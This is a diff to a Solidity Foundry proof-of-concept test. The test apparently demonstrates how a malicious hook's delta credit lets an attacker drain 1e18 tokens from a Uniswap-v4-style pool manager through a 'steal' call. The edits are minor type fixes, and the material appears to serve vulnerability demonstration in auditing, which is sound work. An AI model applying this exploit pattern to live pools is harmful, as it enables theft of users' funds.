@@ -9,6 +9,7 @@ import {TickMath} from "../src/libraries/TickMath.sol";
 import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
 import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
 import {BalanceDelta} from "../src/types/BalanceDelta.sol";
+import {IHooks} from "../src/interfaces/IHooks.sol";
 
 contract Token {
     mapping(address=>uint) public balanceOf;
@@ -33,7 +34,7 @@ contract POC is Test {
         vm.store(address(hook), bytes32(0), bytes32(uint256(uint160(address(manager)))));
         token0.mint(address(this),10000e18); token1.mint(address(this),10000e18);
         token0.mint(address(manager),10000e18); token1.mint(address(manager),10000e18);
-        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
+        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,IHooks(address(hook)));
         hook.setCurrency1(Currency.wrap(address(token1)));
         hook.setAttacker(address(this));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
@@ -53,7 +54,7 @@ contract POC is Test {
             else if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
             if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
             else if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
-            // hook's 1e18 credit - take as hook (no vm.prank needed)
+            // take hook's 1e18
             hook.steal(c0, address(this), 1e18);
         }
         return "";
